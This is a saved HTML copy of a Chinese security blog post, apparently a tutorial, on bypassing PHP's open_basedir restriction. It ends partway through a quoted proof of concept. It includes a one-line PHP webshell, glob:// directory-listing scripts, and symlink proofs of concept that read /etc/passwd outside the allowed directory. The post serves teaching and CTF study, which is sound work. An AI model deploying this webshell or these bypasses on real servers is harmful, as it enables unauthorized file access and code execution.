@@ -1,0 +1,1620 @@
+<!DOCTYPE html>
+<!-- saved from url=(0062)https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Quis custodiet ipsos custodes?">
+    <meta name="keywords" content="Von, Von Blog, Von的博客, luyanchen, 卢彦臣, CTF, security, CS">
+    <meta name="theme-color" content="#000000">
+    
+    <title>open_basedir绕过 - Von的博客 | Von Blog</title>
+
+    <!-- Web App Manifest -->
+    <link rel="manifest" href="https://www.v0n.top/pwa/manifest.json">
+	
+	<script src="./open_basedir绕过 - Von的博客 _ Von Blog_files/jquery.nav.js.下载"></script><script src="./open_basedir绕过 - Von的博客 _ Von Blog_files/fastclick.min.js.下载"></script><script src="./open_basedir绕过 - Von的博客 _ Von Blog_files/anchor.min.js.下载"></script><script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      inlineMath: [['$','$']]
+    }
+  });
+</script>
+<script src="./open_basedir绕过 - Von的博客 _ Von Blog_files/latest.js.下载" async=""></script>
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="https://www.v0n.top/img/favicon.ico">
+
+    <!-- Safari Webpage Icon    by-BY -->
+    <link rel="apple-touch-icon" href="./open_basedir绕过 - Von的博客 _ Von Blog_files/apple-touch-icon.png">
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://vonlyc.github.io/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/">
+
+    <!-- Bootstrap Core CSS -->
+    <!--<link rel="stylesheet" href="/css/bootstrap.min.css">-->
+    <link rel="stylesheet" href="./open_basedir绕过 - Von的博客 _ Von Blog_files/bootstrap.min.css">
+
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="./open_basedir绕过 - Von的博客 _ Von Blog_files/hux-blog.min.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="./open_basedir绕过 - Von的博客 _ Von Blog_files/syntax.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="./open_basedir绕过 - Von的博客 _ Von Blog_files/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+    
+     <style>
+  table{
+    border-left:1px solid #000000;border-top:1px solid #000000;
+    width: 100%;
+    word-wrap:break-word; word-break:break-all;
+  }
+  table th{
+  text-align:center;
+  }
+  table th,td{
+    border-right:1px solid #000000;border-bottom:1px solid #000000;
+  }
+</style>
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<script type="text/javascript" async="" src="./open_basedir绕过 - Von的博客 _ Von Blog_files/MathJax.js.下载"></script><style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
+  position: absolute;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  z-index: 2147483647;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.immersive-translate-input-loading {
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+}
+
+@keyframes immersiveTranslateShadowRolling {
+  0% {
+    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  12% {
+    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  25% {
+    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  36% {
+    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  50% {
+    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
+  }
+
+  62% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
+  }
+
+  75% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
+  }
+
+  87% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
+  }
+
+  100% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
+  }
+}
+</style></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top is-fixed" translate="no">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="https://www.v0n.top/">Von's Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="https://www.v0n.top/">Home</a>
+                    </li>
+                    
+                    <li>
+                        <a href="https://www.v0n.top/about/">About</a>
+                    </li>
+                    
+                    <li>
+                        <a href="https://www.v0n.top/tags/">Tags</a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    var __HuxNav__ = {
+        close: function(){
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        },
+        open: function(){
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+
+    // Bind Event
+    $toggle.addEventListener('click', function(e){
+        if ($navbar.className.indexOf('in') > 0) {
+            __HuxNav__.close()
+        }else{
+            __HuxNav__.open()
+        }
+    })
+
+    /**
+     * Since Fastclick is used to delegate 'touchstart' globally
+     * to hack 300ms delay in iOS by performing a fake 'click',
+     * Using 'e.stopPropagation' to stop 'touchstart' event from 
+     * $toggle/$collapse will break global delegation.
+     * 
+     * Instead, we use a 'e.target' filter to prevent handler
+     * added to document close HuxNav.  
+     *
+     * Also, we use 'click' instead of 'touchstart' as compromise
+     */
+    document.addEventListener('click', function(e){
+        if(e.target == $toggle) return;
+        if(e.target.className == 'icon-bar') return;
+        __HuxNav__.close();
+    })
+</script>
+
+
+    <!-- Image to hack wechat -->
+<!-- <img src="/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="/img/post-bg-universe.jpg" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        position: relative;
+        background-image: url('/img/post-bg-universe.jpg')
+    }
+	<script type="text/javascript" async
+  src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+    
+</style>
+<header class="intro-header">
+    <div class="header-mask"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="https://www.v0n.top/tags/#PHP" title="PHP">PHP</a>
+                        
+                        <a class="tag" href="https://www.v0n.top/tags/#Web" title="Web">Web</a>
+                        
+                    </div>
+                    <h1>open_basedir绕过</h1>
+                    
+                    
+                    <h2 class="subheading"></h2>
+                    
+                    <span class="meta"><i class="fa fa-user" aria-hidden="true"></i>&nbsp;Von's Blog&nbsp;&nbsp;&nbsp;<i class="fa fa-calendar" aria-hidden="true"></i>&nbsp;&nbsp;2020-07-10&nbsp;&nbsp;&nbsp;<i class="fa fa-check-square-o" aria-hidden="true"></i>22320&nbsp;words&nbsp;&nbsp;<span id="busuanzi_container_page_pv">
+                    <i class="fa fa-eye" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">&amp;</span>&nbsp;views</span>
+                </span></div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+				<h1 id="什么是open_basedir">什么是open_basedir</h1>
+<p>Open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。
+一般情况下，我们最多可以绕过open_basedir的限制对其进行列目录。绕过open_basedir进行读写文件危害较大，在php5.3以后很少有能够绕过open_basedir读写文件的方法。</p>
+
+<h1 id="本篇测试脚本">本篇测试脚本</h1>
+<p>本篇所用到的php测试文件是一个一句话木马</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'shell'</span><span class="p">]);</span><span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>并且open_basedir设置为/var/www/html
+<img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/open_basedir_1.png" alt="">
+我们先来看下open_basedir起到的作用，以scandir函数为例。当我们sandir的目录为当前目录时，可以正常输出结果。
+<img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/open_basedir_2.png" alt="">
+当尝试输出上层目录时，无法正常输出。
+<img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/open_basedir_3.png" alt=""></p>
+
+<h1 id="通过系统命令执行绕过">通过系统命令执行绕过</h1>
+<p>但是open_basedir对系统函数并没有做相关的限制，我们用系统函数可以绕过。
+<img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/open_basedir_4.png" alt=""></p>
+
+<h1 id="利用glob绕过">利用glob://绕过</h1>
+<h2 id="glob伪协议">glob://伪协议</h2>
+<p>glob://协议是php5.3.0以后一种查找匹配的文件路径模式。<br>
+官方给出了一个示例用法</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="c1">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span>
+<span class="c1">// 并打印文件名和文件尺寸</span>
+<span class="nv">$it</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DirectoryIterator</span><span class="p">(</span><span class="s2">"glob://ext/spl/examples/*.php"</span><span class="p">);</span>
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$it</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">printf</span><span class="p">(</span><span class="s2">"%s: %.1FK</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$f</span><span class="o">-&gt;</span><span class="nf">getFilename</span><span class="p">(),</span> <span class="nv">$f</span><span class="o">-&gt;</span><span class="nf">getSize</span><span class="p">()</span><span class="o">/</span><span class="mi">1024</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="o">?</span>
+</code></pre></div></div>
+<p>glob://伪协议需要结合其他函数方法才能列目录，单纯传参glob://是没办法列目录的。</p>
+<h2 id="directoryiteratorglob">DirectoryIterator+glob://</h2>
+<p>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)<br>
+脚本差不多如下:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DirectoryIterator</span><span class="p">(</span><span class="s2">"glob:///*"</span><span class="p">);</span>
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$a</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">){</span>
+    <span class="k">echo</span><span class="p">(</span><span class="nv">$f</span><span class="o">-&gt;</span><span class="nf">__toString</span><span class="p">()</span><span class="mf">.</span><span class="s1">'&lt;br&gt;'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>可以看到,成功列出目录:
+<img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/open_basedir_5.png" alt="">
+当传入的参数为glob:///*时会列出根目录下的文件，传入参数为glob://*时会列出open_basedir允许目录下的文件。</p>
+
+<h2 id="scandirglob">scandir()+glob://</h2>
+<p>这是看TCTF WP里面的一种方法，最为简单明了:
+代码如下:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">scandir</span><span class="p">(</span><span class="s1">'glob:///*'</span><span class="p">));</span>
+<span class="o">&gt;</span>
+</code></pre></div></div>
+<p><img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/open_basedir_6.png" alt="">
+这种方法也只能列出根目录和open_basedir允许目录下的文件。</p>
+
+<h2 id="opendirreaddirglob">opendir()+readdir()+glob://</h2>
+<p>脚本如下:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span> <span class="nv">$b</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="s1">'glob:///*'</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="k">while</span> <span class="p">(</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$b</span><span class="p">))</span> <span class="o">!==</span> <span class="kc">false</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$file</span><span class="mf">.</span><span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nb">closedir</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p><img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/open_basedir_7.png" alt="">
+同理，这种方法也只能列出根目录和open_basedir允许目录下的文件。<br>
+可以看到，上面三种和glob://相关的协议，最大的缺陷就是只能列目录，而且还只能列根目录和open_basedir允许目录的内容。</p>
+
+<h1 id="利用symlink绕过">利用symlink()绕过</h1>
+<h2 id="symlink函数">symlink()函数</h2>
+<p>symlink()对于已有的target建立一个名为link的符号连接。<br>
+用法如下:</p>
+<ul>
+  <li>symlink (string $target,string $link) symlink()对于已有的 target(一般情况下受限于open_basedir)建立一个名为link的符号连接。</li>
+  <li>成功时返回TRUE， 或者在失败时返回FALSE。
+示例用法如下:</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$target</span> <span class="o">=</span> <span class="s1">'uploads.php'</span><span class="p">;</span>
+<span class="nv">$link</span> <span class="o">=</span> <span class="s1">'uploads'</span><span class="p">;</span>
+<span class="nb">symlink</span><span class="p">(</span><span class="nv">$target</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
+
+<span class="k">echo</span> <span class="nb">readlink</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
+<span class="c1"># 将会输出'uploads.php'这个字符串</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<h2 id="poc及原理分析">POC及原理分析</h2>
+<p>假如我们要读取/etc/passwd,对应的POC为:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">mkdir</span><span class="p">(</span><span class="s2">"a"</span><span class="p">);</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s2">"a"</span><span class="p">);</span>
+<span class="nb">mkdir</span><span class="p">(</span><span class="s2">"b"</span><span class="p">);</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s2">"b"</span><span class="p">);</span>
+<span class="nb">mkdir</span><span class="p">(</span><span class="s2">"c"</span><span class="p">);</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s2">"c"</span><span class="p">);</span>
+<span class="nb">mkdir</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s2">".."</span><span class="p">);</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s2">".."</span><span class="p">);</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s2">".."</span><span class="p">);</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s2">".."</span><span class="p">);</span>
+<span class="nb">symlink</span><span class="p">(</span><span class="s2">"a/b/c/d"</span><span class="p">,</span><span class="s2">"Von"</span><span class="p">);</span>
+<span class="nb">symlink</span><span class="p">(</span><span class="s2">"Von/../../../../etc/passwd"</span><span class="p">,</span><span class="s2">"exp"</span><span class="p">);</span>
+<span class="nb">unlink</span><span class="p">(</span><span class="s2">"Von"</span><span class="p">);</span>
+<span class="nb">mkdir</span><span class="p">(</span><span class="s2">"Von"</span><span class="p">);</span>
+<span class="nb">system</span><span class="p">(</span><span class="s1">'cat exp'</span><span class="p">);</span>
+</code></pre></div></div>
+<p><img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/open_basedi_8.png" alt="">
+成功读取/etc/passwd.<br>
+我们来分析下这个POC
+<strong>1.</strong> 首先前面8步,实现了创建a/b/c/d目录,并把当前目录移动到该目录下面。<br>
+<strong>2.</strong> 接着symlink(“a/b/c/d”,”Von”)创建了一个符号文件Von,指向了a/b/c/d<br>
+<strong>3.</strong> 接着symlink(“Von/../../../../etc/passwd”,”exp”),由于此时Von仍然是一个符号文件,所以等价于symlink(“a/b/c/d/../../../../etc/passwd”,”exp”),由于此时a/b/c/d/../../../../的结果等于/var/www/html,符合open_basedir的限制,因此软链接可以被成功建立<br>
+<strong>4.</strong> 但是之后我们删除了Von这个软链接，并且建立了一个真实的文件夹Von,所以此时上面symlink(“Von/../../../../etc/passwd”,”exp”)中的Von不再是软链接而是一个真实的目录。从而达到跨目录访问的效果。
+其实到了这一步，我们直接访问根目录下的exp文件能得到结果，我上面是为了让结果直观展示出来才利用使用了system(‘cat exp’)来得到结果。(一般情况下system()是被禁的)
+<img src="./open_basedir绕过 - Von的博客 _ Von Blog_files/open_basedi_10.png" alt="">
+给出两个大神的POC</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="cm">/*
+* by phithon
+* From https://www.leavesongs.com
+* detail: http://cxsecurity.com/issue/WLB-2009110068
+*/</span>
+<span class="nb">header</span><span class="p">(</span><span class="s1">'content-type: text/plain'</span><span class="p">);</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'display_errors'</span><span class="p">,</span> <span class="kc">TRUE</span><span class="p">);</span>
+<span class="nb">printf</span><span class="p">(</span><span class="s2">"open_basedir: %s</span><span class="se">\n</span><span class="s2">php_version: %s</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">),</span> <span class="nb">phpversion</span><span class="p">());</span>
+<span class="nb">printf</span><span class="p">(</span><span class="s2">"disable_functions: %s</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'disable_functions'</span><span class="p">));</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">'/etc/passwd'</span><span class="p">);</span>
+<span class="nv">$relat_file</span> <span class="o">=</span> <span class="nf">getRelativePath</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+<span class="nv">$paths</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+<span class="nv">$name</span> <span class="o">=</span> <span class="nb">mt_rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">999</span><span class="p">;</span>
+<span class="nv">$exp</span> <span class="o">=</span> <span class="nf">getRandStr</span><span class="p">();</span>
+<span class="nb">mkdir</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$paths</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span> <span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+    <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$paths</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+    <span class="nb">chdir</span><span class="p">(</span><span class="nv">$paths</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+<span class="p">}</span>
+<span class="nb">mkdir</span><span class="p">(</span><span class="nv">$paths</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="nb">chdir</span><span class="p">(</span><span class="s1">'..'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nv">$paths</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$relat_file</span><span class="p">);</span>
+<span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$paths</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'..'</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+    <span class="nb">chdir</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+    <span class="nv">$j</span><span class="o">++</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="nv">$j</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="nb">chdir</span><span class="p">(</span><span class="s1">'..'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">array_fill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+<span class="nb">symlink</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">),</span> <span class="s1">'tmplink'</span><span class="p">);</span>
+<span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">array_fill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$j</span><span class="p">,</span> <span class="s1">'..'</span><span class="p">);</span>
+<span class="nb">symlink</span><span class="p">(</span><span class="s1">'tmplink/'</span> <span class="mf">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">)</span> <span class="mf">.</span> <span class="nv">$file</span><span class="p">,</span> <span class="nv">$exp</span><span class="p">);</span>
+<span class="nb">unlink</span><span class="p">(</span><span class="s1">'tmplink'</span><span class="p">);</span>
+<span class="nb">mkdir</span><span class="p">(</span><span class="s1">'tmplink'</span><span class="p">);</span>
+<span class="nf">delfile</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+<span class="nv">$exp</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SCRIPT_NAME'</span><span class="p">])</span> <span class="mf">.</span> <span class="s2">"/</span><span class="si">{</span><span class="nv">$exp</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
+<span class="nv">$exp</span> <span class="o">=</span> <span class="s2">"http://</span><span class="si">{</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SERVER_NAME'</span><span class="p">]</span><span class="si">}{</span><span class="nv">$exp</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">-----------------content---------------</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$exp</span><span class="p">);</span>
+<span class="nf">delfile</span><span class="p">(</span><span class="s1">'tmplink'</span><span class="p">);</span>
+
+<span class="k">function</span> <span class="n">getRelativePath</span><span class="p">(</span><span class="nv">$from</span><span class="p">,</span> <span class="nv">$to</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// some compatibility fixes for Windows paths</span>
+  <span class="nv">$from</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nv">$from</span><span class="p">,</span> <span class="s1">'\/'</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'/'</span><span class="p">;</span>
+  <span class="nv">$from</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="nv">$from</span><span class="p">);</span>
+  <span class="nv">$to</span>   <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="nv">$to</span><span class="p">);</span>
+
+  <span class="nv">$from</span>   <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$from</span><span class="p">);</span>
+  <span class="nv">$to</span>     <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$to</span><span class="p">);</span>
+  <span class="nv">$relPath</span>  <span class="o">=</span> <span class="nv">$to</span><span class="p">;</span>
+
+  <span class="k">foreach</span><span class="p">(</span><span class="nv">$from</span> <span class="k">as</span> <span class="nv">$depth</span> <span class="o">=&gt;</span> <span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// find first non-matching dir</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">===</span> <span class="nv">$to</span><span class="p">[</span><span class="nv">$depth</span><span class="p">])</span> <span class="p">{</span>
+      <span class="c1">// ignore this directory</span>
